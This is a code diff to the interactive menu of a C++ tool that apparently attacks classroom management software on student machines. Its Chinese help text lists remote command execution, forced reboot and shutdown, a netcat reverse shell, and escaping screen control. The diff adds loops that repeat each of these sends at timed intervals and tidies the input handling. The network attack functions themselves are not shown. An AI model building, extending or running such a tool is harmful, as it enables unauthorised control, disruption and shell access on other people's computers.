@@ -563,33 +563,42 @@ void startUI() {
     std::string opt;
     std::string IP;
     int port = 4705, ncport = 8888, loopCount = 1, loopInterval = 22;
-    printf(">>> ");
-    while(std::cin >> opt) {
-        if(opt == "exit") {
+    printf("\n>>> ");
+    while(std::getline(std::cin, opt)) {
+        if(opt == "") {
+            printf(">>> ");
+            continue;
+        }
+        else if(opt == "exit") {
             break;
         }
         else if(opt == "h" || opt == "help") {
-            printf("使用方法：\n先配置信息，然后执行。信息会存储，可以反复使用。\n\n用于配置信息的命令：\n  i(ip)     指定目标机的 IP。\n  p         指定监听的端口。默认值为 4705。\n  l         指定命令的循环次数。默认值为 1。\n  t         指定两次循环之间的时间间隔，单位为秒。默认值为 22。\n  n(ncport) 指定 nc 命令的监听端口。默认值为 8888。\n\n用于执行的命令：\n  h(help) 显示帮助文本。\n  config  显示当前的配置信息。\n  m(msg)  发送信息。\n  c       在目标机上运行指定命令。\n  e       加载额外选项。\n\ne 命令的额外选项：\n  r        重启目标机。\n  s        关闭目标机。\n  g        获取当前的 IP 地址和学生端监听的端口。\n  nc       反弹 Shell。目标机需要能访问互联网。在退出时可使用 exit 命令。\n  break    脱离屏幕控制。需要以管理员身份运行程序。\n  continue 恢复屏幕控制。\n");
+            printf("\n使用方法：\n先配置信息，然后执行。信息会存储，可以反复使用。\n\n用于退出的命令：\n  exit\n\n用于配置信息的命令：\n  i(ip)     指定目标机的 IP。\n  p         指定监听的端口。默认值为 4705。\n  l         指定命令的循环次数。默认值为 1。\n  t         指定两次循环之间的时间间隔，单位为秒。默认值为 22。\n  n(ncport) 指定 nc 命令的监听端口。默认值为 8888。\n\n用于执行的命令：\n  h(help) 显示帮助文本。\n  config  显示当前的配置信息。\n  m(msg)  发送信息。\n  c       在目标机上运行指定命令。\n  e       加载额外选项。\n\ne 命令的额外选项：\n  r        重启目标机。\n  s        关闭目标机。\n  g        获取当前的 IP 地址和学生端监听的端口。\n  nc       反弹 Shell。目标机需要能访问互联网。在退出时可使用 exit 命令。\n  break    脱离屏幕控制。需要以管理员身份运行程序。\n  continue 恢复屏幕控制。\n");
         }
         else if(opt == "i" || opt == "ip") {
             printf("输入目标机的 IP：");
             std::cin >> IP;
+            getchar();
         }
         else if(opt == "p" || opt == "port") {
             printf("输入学生端的端口号：");
             scanf("%d", &port);
+            getchar();
         }
         else if(opt == "n" || opt == "ncport") {
             printf("输入 netcat 监听的端口号：");
             scanf("%d", &ncport);
+            getchar();
         }
         else if(opt == "l") {
             printf("输入命令的循环次数：");
             scanf("%d", &loopCount);
+            getchar();
         }
         else if(opt == "t") {
             printf("输入两次循环之间的时间间隔，单位为秒：");
             scanf("%d", &loopInterval);
+            getchar();
         }
         else if(opt  == "config") {
             printf("指定的 IP 地址：%s\n", IP.c_str());
@@ -610,7 +619,13 @@ void startUI() {
                 printf("输入消息内容：\n");
                 getchar();
                 std::getline(std::cin, msg);
-                jyAtk->sendMsg(IP, port, msg);
+                for(int i = 1; i <= loopCount; i++) {
+                    if(i > 1) Sleep(loopInterval * 1000);
+                    jyAtk->sendMsg(IP, port, msg);
+                    if(loopCount > 1) {
+                        printf("第 %d 次发送完毕。\n", i);
+                    }
+                }
                 printf("发送完毕。\n");
             }
         }
@@ -626,7 +641,13 @@ void startUI() {
                 printf("输入指令内容：\n");
                 getchar();
                 std::getline(std::cin, cmd);
-                jyAtk->sendCmd(IP, port, cmd);
+                for(int i = 1; i <= loopCount; i++) {
+                    if(i > 1) Sleep(loopInterval * 1000);
+                    jyAtk->sendCmd(IP, port, cmd);
+                    if(loopCount > 1) {
+                        printf("第 %d 次发送完毕。\n", i);
+                    }
+                }
                 printf("发送完毕。\n");
             }
         }
@@ -634,6 +655,7 @@ void startUI() {
             std::string extraOpt;
             printf("输入额外选项：");
             std::cin >> extraOpt;
+            getchar();
             if(extraOpt == "g") {
                 auto localIPs = jyAtk->client->getLocalIPs();
                 printf("你的本地 IP 地址：");
@@ -684,7 +706,13 @@ void startUI() {
                     printf("非法的端口号。\n");
                 }
                 else {
-                    jyAtk->sendReboot(IP, port);
+                    for(int i = 1; i <= loopCount; i++) {
+                        if(i > 1) Sleep(loopInterval * 1000);
+                        jyAtk->sendReboot(IP, port);
+                        if(loopCount > 1) {
+                            printf("第 %d 次发送完毕。\n", i);
+                        }
+                    }
                     printf("发送完毕。\n");
                 }
             }
@@ -696,7 +724,13 @@ void startUI() {
                     printf("非法的端口号。\n");
                 }
                 else {
-                    jyAtk->sendShutdown(IP, port);
+                    for(int i = 1; i <= loopCount; i++) {
+                        if(i > 1) Sleep(loopInterval * 1000);
+                        jyAtk->sendShutdown(IP, port);
+                        if(loopCount > 1) {
+                            printf("第 %d 次发送完毕。\n", i);
+                        }
+                    }
                     printf("发送完毕。\n");
                 }
             }
@@ -720,9 +754,9 @@ void startUI() {
             }
         }
         else {
-            printf("未知的指令。请输入 help 以获取帮助。\n");
+            printf("未知的命令。请输入 help 以获取帮助。\n");
         }
-        printf(">>> ");
+        printf("\n>>> ");
     }
     return;
 }
